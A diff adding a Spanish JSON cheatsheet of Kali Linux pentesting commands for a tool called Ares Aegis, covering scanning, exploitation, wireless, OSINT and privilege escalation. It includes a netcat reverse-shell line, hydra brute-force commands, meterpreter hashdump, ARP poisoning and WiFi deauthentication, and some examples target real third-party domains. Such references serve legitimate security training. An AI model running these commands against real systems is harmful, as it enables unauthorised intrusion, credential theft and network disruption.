@@ -1,0 +1,880 @@
+{
+  "metadatos": {
+    "version": "1.0.0",
+    "autor": "DogSoulDev",
+    "descripcion": "Cheatsheet completo de comandos Kali Linux para Ares Aegis",
+    "fecha_actualizacion": "2025-07-18"
+  },
+  "categorias": {
+    "reconocimiento": {
+      "titulo": "🔍 Reconocimiento y Escaneo",
+      "descripcion": "Herramientas para recopilar información sobre objetivos",
+      "herramientas": {
+        "nmap": {
+          "descripcion": "Escáner de red y puertos más potente",
+          "comandos": [
+            {
+              "comando": "nmap -sS TARGET",
+              "descripcion": "Escaneo SYN stealth de un host",
+              "ejemplo": "nmap -sS hackthebox.eu"
+            },
+            {
+              "comando": "nmap -sV -O NETWORK/CIDR",
+              "descripcion": "Detección de versión y OS en red",
+              "ejemplo": "nmap -sV -O 172.16.0.0/16"
+            },
+            {
+              "comando": "nmap -p- --open HOST",
+              "descripcion": "Escanear todos los puertos abiertos",
+              "ejemplo": "nmap -p- --open tryhackme.com"
+            },
+            {
+              "comando": "nmap -sC -sV -oA OUTPUT HOST",
+              "descripcion": "Escaneo completo con scripts y detección",
+              "ejemplo": "nmap -sC -sV -oA full_scan vulnhub.local"
+            },
+            {
+              "comando": "nmap --script vuln HOST",
+              "descripcion": "Ejecutar scripts de vulnerabilidades",
+              "ejemplo": "nmap --script vuln 10.129.95.234"
+            }
+          ]
+        },
+        "netdiscover": {
+          "descripcion": "Descubrimiento de hosts en red local",
+          "comandos": [
+            {
+              "comando": "netdiscover -r NETWORK/CIDR",
+              "descripcion": "Descubrir hosts en rango de red",
+              "ejemplo": "netdiscover -r 172.31.0.0/16"
+            },
+            {
+              "comando": "netdiscover -i INTERFACE -r NETWORK",
+              "descripcion": "Especificar interfaz para descubrimiento",
+              "ejemplo": "netdiscover -i eth1 -r 10.0.0.0/8"
+            }
+          ]
+        },
+        "masscan": {
+          "descripcion": "Escáner de puertos ultra-rápido",
+          "comandos": [
+            {
+              "comando": "masscan -p PORTS NETWORK --rate=RATE",
+              "descripcion": "Escaneo rápido de puertos específicos",
+              "ejemplo": "masscan -p21,22,23,53,80,443,993,995 192.168.0.0/16 --rate=2000"
+            },
+            {
+              "comando": "masscan -pU:53,161 NETWORK --rate=RATE",
+              "descripcion": "Escaneo UDP de puertos específicos",
+              "ejemplo": "masscan -pU:53,161,162,500 10.10.0.0/16 --rate=1500"
+            }
+          ]
+        },
+        "gobuster": {
+          "descripcion": "Enumeración de directorios y archivos web",
+          "comandos": [
+            {
+              "comando": "gobuster dir -u URL -w WORDLIST",
+              "descripcion": "Buscar directorios ocultos",
+              "ejemplo": "gobuster dir -u https://example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt"
+            },
+            {
+              "comando": "gobuster dns -d DOMAIN -w WORDLIST",
+              "descripcion": "Enumeración de subdominios",
+              "ejemplo": "gobuster dns -d microsoft.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"
+            }
+          ]
+        }
+      }
+    },
+    "vulnerabilidades": {
+      "titulo": "🛡️ Análisis de Vulnerabilidades",
+      "descripcion": "Herramientas para identificar y explotar vulnerabilidades",
+      "herramientas": {
+        "nikto": {
+          "descripcion": "Escáner de vulnerabilidades web",
+          "comandos": [
+            {
+              "comando": "nikto -h URL",
+              "descripcion": "Escaneo básico de vulnerabilidades web",
+              "ejemplo": "nikto -h https://owasp.org"
+            },
+            {
+              "comando": "nikto -h URL -p PORT -ssl",
+              "descripcion": "Escaneo HTTPS en puerto específico",
+              "ejemplo": "nikto -h https://target.htb -p 8443 -ssl"
+            },
+            {
+              "comando": "nikto -h URL -o OUTPUT.txt -Format txt",
+              "descripcion": "Guardar resultados en archivo",
+              "ejemplo": "nikto -h http://vulnerable.local -o scan_results.txt -Format txt"
+            }
+          ]
+        },
+        "openvas": {
+          "descripcion": "Suite completa de análisis de vulnerabilidades",
+          "comandos": [
+            {
+              "comando": "gvm-start",
+              "descripcion": "Iniciar servicios OpenVAS/GVM",
+              "ejemplo": "gvm-start"
+            },
+            {
+              "comando": "gvm-check-setup",
+              "descripcion": "Verificar configuración del sistema",
+              "ejemplo": "gvm-check-setup"
+            }
+          ]
+        },
+        "sqlmap": {
+          "descripcion": "Herramienta para detectar y explotar SQL injection",
+          "comandos": [
+            {
+              "comando": "sqlmap -u 'URL?param=VALUE' --dbs",
+              "descripcion": "Detectar SQL injection y listar bases de datos",
+              "ejemplo": "sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' --dbs"
+            },
+            {
+              "comando": "sqlmap -u URL --forms --batch --crawl=3",
+              "descripcion": "Escaneo automático de formularios",
+              "ejemplo": "sqlmap -u http://dvwa.local --forms --batch --crawl=2"
+            },
+            {
+              "comando": "sqlmap -r REQUEST.txt --dump",
+              "descripcion": "Usar archivo de request y extraer datos",
+              "ejemplo": "sqlmap -r burp_request.txt --dump -T users"
+            }
+          ]
+        },
+        "wpscan": {
+          "descripcion": "Escáner de vulnerabilidades WordPress",
+          "comandos": [
+            {
+              "comando": "wpscan --url URL --enumerate u,p,t",
+              "descripcion": "Enumerar usuarios, plugins y temas",
+              "ejemplo": "wpscan --url https://blog.example.com --enumerate u,p,t"
+            },
+            {
+              "comando": "wpscan --url URL --passwords WORDLIST",
+              "descripcion": "Ataque de fuerza bruta a usuarios",
+              "ejemplo": "wpscan --url http://wordpress.local --passwords /usr/share/wordlists/rockyou.txt"
+            }
+          ]
+        }
+      }
+    },
+    "explotacion": {
+      "titulo": "⚔️ Explotación",
+      "descripcion": "Herramientas para explotar vulnerabilidades encontradas",
+      "herramientas": {
+        "metasploit": {
+          "descripcion": "Framework de explotación más completo",
+          "comandos": [
+            {
+              "comando": "msfconsole",
+              "descripcion": "Iniciar consola de Metasploit",
+              "ejemplo": "msfconsole -q"
+            },
+            {
+              "comando": "search KEYWORD",
+              "descripcion": "Buscar exploits específicos",
+              "ejemplo": "search type:exploit platform:windows smb"
+            },
+            {
+              "comando": "use EXPLOIT_PATH",
+              "descripcion": "Seleccionar exploit específico",
+              "ejemplo": "use auxiliary/scanner/portscan/syn"
+            },
+            {
+              "comando": "set PARAMETER VALUE",
+              "descripcion": "Configurar parámetros del exploit",
+              "ejemplo": "set RHOSTS 10.10.10.0/24"
+            },
+            {
+              "comando": "show payloads",
+              "descripcion": "Mostrar payloads compatibles",
+              "ejemplo": "show payloads"
+            }
+          ]
+        },
+        "hydra": {
+          "descripcion": "Herramienta de fuerza bruta para passwords",
+          "comandos": [
+            {
+              "comando": "hydra -l USER -P WORDLIST PROTOCOL://TARGET",
+              "descripcion": "Ataque de fuerza bruta básico",
+              "ejemplo": "hydra -l administrator -P /usr/share/wordlists/rockyou.txt ssh://10.129.95.134"
+            },
+            {
+              "comando": "hydra -L USERLIST -p PASSWORD PROTOCOL://TARGET",
+              "descripcion": "Probar una contraseña contra múltiples usuarios",
+              "ejemplo": "hydra -L users.txt -p password123 ftp://192.168.1.100"
+            },
+            {
+              "comando": "hydra -l USER -P WORDLIST TARGET http-post-form 'PATH:PARAMS:ERROR'",
+              "descripcion": "Ataque a formulario web HTTP POST",
+              "ejemplo": "hydra -l admin -P passwords.txt example.com http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'"
+            }
+          ]
+        },
+        "john": {
+          "descripcion": "Crackeador de contraseñas John the Ripper",
+          "comandos": [
+            {
+              "comando": "john --wordlist=WORDLIST HASHFILE",
+              "descripcion": "Crackear hashes con diccionario",
+              "ejemplo": "john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow"
+            },
+            {
+              "comando": "john --show HASHFILE",
+              "descripcion": "Mostrar contraseñas crackeadas",
+              "ejemplo": "john --show hashes.txt"
+            },
+            {
+              "comando": "john --format=FORMAT HASHFILE",
+              "descripcion": "Especificar formato de hash",
+              "ejemplo": "john --format=md5crypt-long hash_md5.txt"
+            }
+          ]
+        },
+        "hashcat": {
+          "descripcion": "Crackeador de contraseñas avanzado con GPU",
+          "comandos": [
+            {
+              "comando": "hashcat -m MODE HASHFILE WORDLIST",
+              "descripcion": "Crackear hashes especificando modo",
+              "ejemplo": "hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt"
+            },
+            {
+              "comando": "hashcat -m MODE HASHFILE -a 3 MASK",
+              "descripcion": "Ataque de fuerza bruta con máscara",
+              "ejemplo": "hashcat -m 0 md5_hash.txt -a 3 ?d?d?d?d?d?d"
+            }
+          ]
+        }
+      }
+    },
+    "post_explotacion": {
+      "titulo": "🎯 Post-Explotación",
+      "descripcion": "Herramientas para mantener acceso y escalada de privilegios",
+      "herramientas": {
+        "meterpreter": {
+          "descripcion": "Payload avanzado de Metasploit",
+          "comandos": [
+            {
+              "comando": "getuid",
+              "descripcion": "Obtener ID de usuario actual",
+              "ejemplo": "getuid"
+            },
+            {
+              "comando": "getsystem",
+              "descripcion": "Escalar a privilegios SYSTEM",
+              "ejemplo": "getsystem"
+            },
+            {
+              "comando": "hashdump",
+              "descripcion": "Extraer hashes de contraseñas",
+              "ejemplo": "hashdump"
+            }
+          ]
+        },
+        "netcat": {
+          "descripcion": "Navaja suiza de red para shells reversos",
+          "comandos": [
+            {
+              "comando": "nc -lvp 4444",
+              "descripcion": "Listener para shell reverso",
+              "ejemplo": "nc -lvp 1234"
+            },
+            {
+              "comando": "nc 192.168.1.100 4444 -e /bin/bash",
+              "descripcion": "Conectar shell reverso",
+              "ejemplo": "nc 10.10.10.50 1234 -e /bin/sh"
+            }
+          ]
+        }
+      }
+    },
+    "forense": {
+      "titulo": "🔬 Análisis Forense",
+      "descripcion": "Herramientas para análisis forense digital",
+      "herramientas": {
+        "autopsy": {
+          "descripcion": "Plataforma de análisis forense digital",
+          "comandos": [
+            {
+              "comando": "autopsy",
+              "descripcion": "Iniciar interfaz web de Autopsy",
+              "ejemplo": "autopsy"
+            }
+          ]
+        },
+        "volatility": {
+          "descripcion": "Análisis de memoria RAM",
+          "comandos": [
+            {
+              "comando": "volatility -f memory.dump imageinfo",
+              "descripcion": "Obtener información de imagen de memoria",
+              "ejemplo": "volatility -f dump.mem --profile=Win7SP1x64 pslist"
+            }
+          ]
+        },
+        "binwalk": {
+          "descripcion": "Análisis de firmware y archivos binarios",
+          "comandos": [
+            {
+              "comando": "binwalk -e firmware.bin",
+              "descripcion": "Extraer archivos de firmware",
+              "ejemplo": "binwalk -e router_firmware.bin"
+            }
+          ]
+        }
+      }
+    },
+    "wireless": {
+      "titulo": "📡 Wireless Hacking",
+      "descripcion": "Herramientas para auditoría de redes inalámbricas",
+      "herramientas": {
+        "aircrack-ng": {
+          "descripcion": "Suite completa para auditoría WiFi",
+          "comandos": [
+            {
+              "comando": "airmon-ng start INTERFACE",
+              "descripcion": "Poner interfaz en modo monitor",
+              "ejemplo": "airmon-ng start wlan0"
+            },
+            {
+              "comando": "airodump-ng INTERFACE_MON",
+              "descripcion": "Escanear redes WiFi disponibles",
+              "ejemplo": "airodump-ng wlan0mon"
+            },
+            {
+              "comando": "airodump-ng -c CHANNEL --bssid BSSID -w OUTPUT INTERFACE",
+              "descripcion": "Capturar handshake WPA/WPA2",
+              "ejemplo": "airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon"
+            },
+            {
+              "comando": "aireplay-ng -0 COUNT -a BSSID INTERFACE",
+              "descripcion": "Ataque de desautenticación",
+              "ejemplo": "aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon"
+            },
+            {
+              "comando": "aircrack-ng -w WORDLIST CAPTURE_FILE",
+              "descripcion": "Crackear WPA/WPA2 con diccionario",
+              "ejemplo": "aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap"
+            }
+          ]
+        },
+        "reaver": {
+          "descripcion": "Ataque WPS con fuerza bruta",
+          "comandos": [
+            {
+              "comando": "reaver -i INTERFACE -b BSSID -vv",
+              "descripcion": "Ataque WPS básico con verbose",
+              "ejemplo": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv"
+            },
+            {
+              "comando": "reaver -i INTERFACE -b BSSID -vv -d DELAY",
+              "descripcion": "Ataque WPS con delay personalizado",
+              "ejemplo": "reaver -i wlan0mon -b 00:22:44:66:88:AA -vv -d 15"
+            },
+            {
+              "comando": "wash -i INTERFACE",
+              "descripcion": "Buscar APs con WPS habilitado",
+              "ejemplo": "wash -i wlan0mon"
+            }
+          ]
+        },
+        "kismet": {
+          "descripcion": "Detector y analizador de redes inalámbricas",
+          "comandos": [
+            {
+              "comando": "kismet",
+              "descripcion": "Iniciar Kismet con interfaz web",
+              "ejemplo": "kismet"
+            },
+            {
+              "comando": "kismet -c INTERFACE",
+              "descripcion": "Especificar interfaz de captura",
+              "ejemplo": "kismet -c wlan0"
+            }
+          ]
+        }
+      }
+    },
+    "steganografia": {
+      "titulo": "🖼️ Esteganografía",
+      "descripcion": "Herramientas para ocultar y extraer información",
+      "herramientas": {
+        "steghide": {
+          "descripcion": "Ocultar datos en imágenes y audio",
+          "comandos": [
+            {
+              "comando": "steghide embed -cf imagen.jpg -ef secreto.txt",
+              "descripcion": "Ocultar archivo en imagen",
+              "ejemplo": "steghide embed -cf photo.jpg -ef password.txt"
+            },
+            {
+              "comando": "steghide extract -sf imagen.jpg",
+              "descripcion": "Extraer archivo oculto de imagen",
+              "ejemplo": "steghide extract -sf suspicious.jpg"
+            }
+          ]
+        },
+        "exiftool": {
+          "descripcion": "Leer y escribir metadatos de archivos",
+          "comandos": [
+            {
+              "comando": "exiftool imagen.jpg",
+              "descripcion": "Ver metadatos de imagen",
+              "ejemplo": "exiftool photo.png"
+            }
+          ]
+        }
+      }
+    },
+    "redes": {
+      "titulo": "🌐 Análisis de Red",
+      "descripcion": "Herramientas para monitoreo y análisis de tráfico",
+      "herramientas": {
+        "wireshark": {
+          "descripcion": "Analizador de protocolos de red",
+          "comandos": [
+            {
+              "comando": "wireshark",
+              "descripcion": "Iniciar Wireshark con interfaz gráfica",
+              "ejemplo": "wireshark"
+            },
+            {
+              "comando": "tshark -i eth0 -w capture.pcap",
+              "descripcion": "Capturar tráfico desde línea de comandos",
+              "ejemplo": "tshark -i wlan0 -w traffic.pcap"
+            }
+          ]
+        },
+        "tcpdump": {
+          "descripcion": "Capturador de paquetes desde terminal",
+          "comandos": [
+            {
+              "comando": "tcpdump -i eth0 host 192.168.1.100",
+              "descripcion": "Capturar tráfico de host específico",
+              "ejemplo": "tcpdump -i any port 80"
+            }
+          ]
+        },
+        "ettercap": {
+          "descripcion": "Suite para ataques man-in-the-middle",
+          "comandos": [
+            {
+              "comando": "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//",
+              "descripcion": "Ataque ARP poisoning",
+              "ejemplo": "ettercap -T -M arp:remote /10.0.0.1// /10.0.0.50//"
+            }
+          ]
+        }
+      }
+    },
+    "reversing": {
+      "titulo": "🔄 Ingeniería Inversa",
+      "descripcion": "Herramientas para análisis de malware y reversing",
+      "herramientas": {
+        "ghidra": {
+          "descripcion": "Suite de ingeniería inversa de la NSA",
+          "comandos": [
+            {
+              "comando": "ghidra",
+              "descripcion": "Iniciar Ghidra para análisis de binarios",
+              "ejemplo": "ghidra"
+            }
+          ]
+        },
+        "radare2": {
+          "descripcion": "Framework de ingeniería inversa",
+          "comandos": [
+            {
+              "comando": "r2 binary_file",
+              "descripcion": "Analizar archivo binario",
+              "ejemplo": "r2 malware.exe"
+            },
+            {
+              "comando": "aaa",
+              "descripcion": "Análisis automático completo (dentro de r2)",
+              "ejemplo": "aaa"
+            },
+            {
+              "comando": "pdf @ main",
+              "descripcion": "Desensamblar función main",
+              "ejemplo": "pdf @ main"
+            }
+          ]
+        },
+        "strings": {
+          "descripcion": "Extraer cadenas de texto de binarios",
+          "comandos": [
+            {
+              "comando": "strings binary_file",
+              "descripcion": "Mostrar strings del archivo",
+              "ejemplo": "strings suspicious.exe"
+            },
+            {
+              "comando": "strings -n LENGTH binary_file",
+              "descripcion": "Strings de longitud mínima específica",
+              "ejemplo": "strings -n 10 malware.bin"
+            }
+          ]
+        },
+        "ltrace": {
+          "descripcion": "Rastrear llamadas a librerías dinámicas",
+          "comandos": [
+            {
+              "comando": "ltrace ./programa",
+              "descripcion": "Rastrear llamadas de librería",
+              "ejemplo": "ltrace ./vulnerable_app"
+            }
+          ]
+        },
+        "strace": {
+          "descripcion": "Rastrear llamadas al sistema",
+          "comandos": [
+            {
+              "comando": "strace ./programa",
+              "descripcion": "Rastrear system calls",
+              "ejemplo": "strace -e trace=file ./app"
+            }
+          ]
+        }
+      }
+    },
+    "osint": {
+      "titulo": "🕵️ OSINT - Inteligencia de Fuentes Abiertas",
+      "descripcion": "Herramientas para recopilación de información pública",
+      "herramientas": {
+        "maltego": {
+          "descripcion": "Plataforma de análisis de enlaces e inteligencia",
+          "comandos": [
+            {
+              "comando": "maltego",
+              "descripcion": "Iniciar Maltego para análisis OSINT",
+              "ejemplo": "maltego"
+            }
+          ]
+        },
+        "theHarvester": {
+          "descripcion": "Recopilar emails, subdominios y hosts",
+          "comandos": [
+            {
+              "comando": "theharvester -d DOMAIN -b google",
+              "descripcion": "Buscar información con Google",
+              "ejemplo": "theharvester -d example.com -b google"
+            },
+            {
+              "comando": "theharvester -d DOMAIN -b all -l 500",
+              "descripcion": "Búsqueda completa con límite de resultados",
+              "ejemplo": "theharvester -d target.com -b all -l 300"
+            }
+          ]
+        },
+        "recon-ng": {
+          "descripcion": "Framework de reconocimiento modular",
+          "comandos": [
+            {
+              "comando": "recon-ng",
+              "descripcion": "Iniciar framework recon-ng",
+              "ejemplo": "recon-ng"
+            },
+            {
+              "comando": "marketplace search",
+              "descripcion": "Buscar módulos disponibles (dentro de recon-ng)",
+              "ejemplo": "marketplace search"
+            }
+          ]
+        },
+        "whois": {
+          "descripcion": "Información de registro de dominios",
+          "comandos": [
+            {
+              "comando": "whois domain.com",
+              "descripcion": "Obtener información WHOIS del dominio",
+              "ejemplo": "whois google.com"
+            }
+          ]
+        },
+        "dnsrecon": {
+          "descripcion": "Herramienta de enumeración DNS",
+          "comandos": [
+            {
+              "comando": "dnsrecon -d DOMAIN",
+              "descripcion": "Enumeración DNS básica",
+              "ejemplo": "dnsrecon -d microsoft.com"
+            },
+            {
+              "comando": "dnsrecon -d DOMAIN -t brt -D wordlist.txt",
+              "descripcion": "Fuerza bruta de subdominios",
+              "ejemplo": "dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+            }
+          ]
+        }
+      }
+    },
+    "buffer_overflow": {
+      "titulo": "💥 Buffer Overflow",
+      "descripcion": "Herramientas para explotar desbordamientos de buffer",
+      "herramientas": {
+        "gdb": {
+          "descripcion": "Debugger GNU para análisis de binarios",
+          "comandos": [
+            {
+              "comando": "gdb ./vulnerable_program",
+              "descripcion": "Iniciar debugging del programa",
+              "ejemplo": "gdb ./buffer_overflow_challenge"
+            },
+            {
+              "comando": "run AAAA",
+              "descripcion": "Ejecutar programa con argumentos (dentro de gdb)",
+              "ejemplo": "run $(python -c 'print \"A\"*200')"
+            },
+            {
+              "comando": "disas main",
+              "descripcion": "Desensamblar función main",
+              "ejemplo": "disas main"
+            },
+            {
+              "comando": "x/100x $esp",
+              "descripcion": "Examinar stack pointer",
+              "ejemplo": "x/50x $esp"
+            }
+          ]
+        },
+        "pwndbg": {
+          "descripcion": "Plugin de GDB para explotación",
+          "comandos": [
+            {
+              "comando": "checksec",
+              "descripcion": "Verificar protecciones del binario (en pwndbg)",
+              "ejemplo": "checksec"
+            },
+            {
+              "comando": "cyclic 200",
+              "descripcion": "Generar patrón cíclico",
+              "ejemplo": "cyclic 300"
+            }
+          ]
+        },
+        "immunity_debugger": {
+          "descripcion": "Debugger para Windows (en Wine)",
+          "comandos": [
+            {
+              "comando": "wine immunity_debugger.exe",
+              "descripcion": "Ejecutar Immunity Debugger",
+              "ejemplo": "wine immunity_debugger.exe"
+            }
+          ]
+        }
+      }
+    },
+    "privilege_escalation": {
+      "titulo": "⬆️ Escalada de Privilegios",
+      "descripcion": "Herramientas para escalada de privilegios en sistemas",
+      "herramientas": {
+        "linpeas": {
+          "descripcion": "Script de enumeración para Linux",
+          "comandos": [
+            {
+              "comando": "./linpeas.sh",
+              "descripcion": "Ejecutar enumeración automática Linux",
+              "ejemplo": "./linpeas.sh | tee linpeas_output.txt"
+            }
+          ]
+        },
+        "winpeas": {
+          "descripcion": "Script de enumeración para Windows",
+          "comandos": [
+            {
+              "comando": "winpeas.exe",
+              "descripcion": "Ejecutar enumeración automática Windows",
+              "ejemplo": "winpeas.exe > winpeas_output.txt"
+            }
+          ]
+        },
+        "linux_exploit_suggester": {
+          "descripcion": "Sugerir exploits para escalada en Linux",
+          "comandos": [
+            {
+              "comando": "./linux-exploit-suggester.sh",
+              "descripcion": "Buscar exploits locales disponibles",
+              "ejemplo": "./les.sh"
+            }
+          ]
+        },
+        "gtfobins": {
+          "descripcion": "Técnicas de escalada usando binarios legítimos",
+          "comandos": [
+            {
+              "comando": "sudo -l",
+              "descripcion": "Ver comandos sudo permitidos",
+              "ejemplo": "sudo -l"
+            },
+            {
+              "comando": "find / -perm -4000 2>/dev/null",
+              "descripcion": "Buscar binarios SUID",
+              "ejemplo": "find / -perm -4000 -type f 2>/dev/null"
+            }
+          ]
+        }
+      }
+    },
+    "mobile_security": {
+      "titulo": "📱 Seguridad Móvil",
+      "descripcion": "Herramientas para análisis de aplicaciones móviles",
+      "herramientas": {
+        "apktool": {
+          "descripcion": "Descompilar y recompilar APKs de Android",
+          "comandos": [
+            {
+              "comando": "apktool d app.apk",
+              "descripcion": "Descompilar APK",
+              "ejemplo": "apktool d target_app.apk"
+            },
+            {
+              "comando": "apktool b folder_name",
+              "descripcion": "Recompilar APK desde carpeta",
+              "ejemplo": "apktool b target_app"
+            }
+          ]
+        },
+        "dex2jar": {
+          "descripcion": "Convertir archivos .dex a .jar",
+          "comandos": [
+            {
+              "comando": "d2j-dex2jar app.apk",
+              "descripcion": "Convertir APK a JAR",
+              "ejemplo": "d2j-dex2jar classes.dex"
+            }
+          ]
+        },
+        "jadx": {
+          "descripcion": "Decompilador de aplicaciones Android",
+          "comandos": [
+            {
+              "comando": "jadx app.apk",
+              "descripcion": "Decompilar APK a código Java",
+              "ejemplo": "jadx -d output_folder target.apk"
+            }
+          ]
+        }
+      }
+    },
+    "cloud_security": {
+      "titulo": "☁️ Seguridad en la Nube",
+      "descripcion": "Herramientas para auditoría de servicios cloud",
+      "herramientas": {
+        "awscli": {
+          "descripcion": "Interface de línea de comandos de AWS",
+          "comandos": [
+            {
+              "comando": "aws s3 ls",
+              "descripcion": "Listar buckets S3",
+              "ejemplo": "aws s3 ls s3://bucket-name"
+            },
+            {
+              "comando": "aws iam list-users",
+              "descripcion": "Listar usuarios IAM",
+              "ejemplo": "aws iam list-users"
+            }
+          ]
+        },
+        "scoutsuite": {
+          "descripcion": "Auditoría de seguridad multi-cloud",
+          "comandos": [
+            {
+              "comando": "scout aws",
+              "descripcion": "Auditar configuración AWS",
+              "ejemplo": "scout aws --report-dir aws_audit"
+            }
+          ]
+        },
+        "pacu": {
+          "descripcion": "Framework de explotación AWS",
+          "comandos": [
+            {
+              "comando": "pacu",
+              "descripcion": "Iniciar framework Pacu",
+              "ejemplo": "pacu"
+            }
+          ]
+        }
+      }
+    },
+    "utilidades": {
+      "titulo": "🛠️ Utilidades Generales",
+      "descripcion": "Herramientas de utilidad general para pentesting",
+      "herramientas": {
+        "searchsploit": {
+          "descripcion": "Buscar exploits en Exploit Database",
+          "comandos": [
+            {
+              "comando": "searchsploit KEYWORD",
+              "descripcion": "Buscar exploits por palabra clave",
+              "ejemplo": "searchsploit apache 2.4"
+            },
+            {
+              "comando": "searchsploit -m EDB_ID",
+              "descripcion": "Descargar exploit específico",
+              "ejemplo": "searchsploit -m 45233"
+            }
+          ]
+        },
+        "curl": {
+          "descripcion": "Herramienta de transferencia de datos",
+          "comandos": [
+            {
+              "comando": "curl -X GET URL",
+              "descripcion": "Petición GET básica",
+              "ejemplo": "curl -X GET https://api.example.com/users"
+            },
+            {
+              "comando": "curl -X POST -d 'data=value' URL",
+              "descripcion": "Petición POST con datos",
+              "ejemplo": "curl -X POST -d 'username=admin&password=123' http://login.example.com"
+            },
+            {
+              "comando": "curl -I URL",
+              "descripcion": "Solo headers de respuesta",
+              "ejemplo": "curl -I https://target.com"
+            }
+          ]
+        },
+        "base64": {
+          "descripcion": "Codificación y decodificación Base64",
+          "comandos": [
+            {
+              "comando": "echo 'texto' | base64",
+              "descripcion": "Codificar texto en Base64",
+              "ejemplo": "echo 'admin:password' | base64"
+            },
+            {
+              "comando": "echo 'Y29kaWZpY2Fkbw==' | base64 -d",
+              "descripcion": "Decodificar Base64",
+              "ejemplo": "echo 'dGVzdA==' | base64 -d"
+            }
+          ]
+        },
+        "xxd": {
+          "descripcion": "Dump hexadecimal y editor binario",
+          "comandos": [
+            {
+              "comando": "xxd archivo",
+              "descripcion": "Ver contenido en hexadecimal",
+              "ejemplo": "xxd binary_file"
+            },
+            {
+              "comando": "xxd -r -p",
+              "descripcion": "Convertir hex a binario",
+              "ejemplo": "echo '48656c6c6f' | xxd -r -p"
+            }
+          ]
+        }
+      }
+    }
+  }
+}
